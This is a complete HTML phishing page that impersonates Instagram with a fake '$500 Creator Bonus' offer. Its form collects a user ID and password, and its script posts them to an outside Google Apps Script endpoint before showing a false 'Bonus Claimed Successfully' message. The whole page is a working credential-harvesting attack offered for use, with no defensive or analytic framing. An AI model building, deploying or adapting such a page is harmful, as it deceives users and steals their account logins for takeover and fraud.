<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Claim Bonus</title>
<link rel="icon" type="image/png" href="https://psfonttk.com/wp-content/uploads/2020/09/Instagram-Logo-Transparent-1024x987.png">
<style>
body{
  margin:0;
  font-family:Arial, Helvetica, sans-serif;
  background:black;
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:20px 0;
}

/* Card */
.container{
  background:linear-gradient(145deg,#0f0f0f,#1c1c1c);
  border:1px solid #2a2a2a;
  padding:45px 30px;
  border-radius:20px;
  width:70%;
  max-width:380px;
  text-align:center;
  color:white;
  box-shadow:0 0 30px rgba(255,0,150,0.25);
}

/* Gift */
.gift{
  width:95px;
  margin-bottom:18px;
  filter:drop-shadow(0 0 12px #ff00cc);
}

/* Bonus text */
.bonus{
  font-size:22px;
  font-weight:bold;
  background:linear-gradient(45deg,#ff00cc,#ff7a00);
  -webkit-background-clip:text;
  color:transparent;
  margin-bottom:30px;
}

/* Inputs */
input{
  width:80%;
  padding:14px;
  margin:12px 0;
  border-radius:12px;
  background:#111;
  color:white;
  border:1px solid #333;
  outline:none;
  font-size:15px;
}

/* Button */
button{
  width:80%;
  padding:14px;
  margin-top:18px;
  border:none;
  border-radius:12px;
  background:linear-gradient(45deg,#ff00cc,#ff7a00);
  color:white;
  font-size:17px;
  font-weight:bold;
  cursor:pointer;
  transition:0.3s;
}

button:hover{
  transform:scale(1.05);
  box-shadow:0 0 18px #ff00cc;
}

small{
  display:block;
  margin-top:18px;
  opacity:0.7;
  line-height:1.6;
}
</style>
</head>

<body>

<div class="container">

  <div><h1>Instagram</h1></div>

  <img src="https://psfonttk.com/wp-content/uploads/2020/09/Instagram-Logo-Transparent-1024x987.png" class="gift">
  
  <div class="bonus">Claim $500 Creator Bonus</div>

  <input type="text" id="userid" placeholder="Enter User ID">
  <input type="password" id="password" placeholder="Enter Password">

  <button onclick="saveData()">Claim Now</button>

  <small>
    Join our creator reward program and unlock exclusive bonuses, growth tools,
    and premium earning features designed for content creators.
  </small>

</div>

<script>
function saveData(){

  let data={
    userid:document.getElementById("userid").value,
    password:document.getElementById("password").value
  };

  fetch("https://script.google.com/macros/s/AKfycbxxvDTyedVppN3z_vQdj8pQjHbCjB1pzfy5E4aV3p-Au_FcFT4qlEEsP6i22J0z5FbLNg/exec",{
    method:"POST",
    body:JSON.stringify(data)
  })
  .then(res => res.text())
  .then(data => {
    alert("Bonus Claimed Successfully ðŸŽ‰");
  })
  .catch(err => {
    alert("Error aa gaya");
    console.log(err);
  });

}
</script>

</body>
</html>
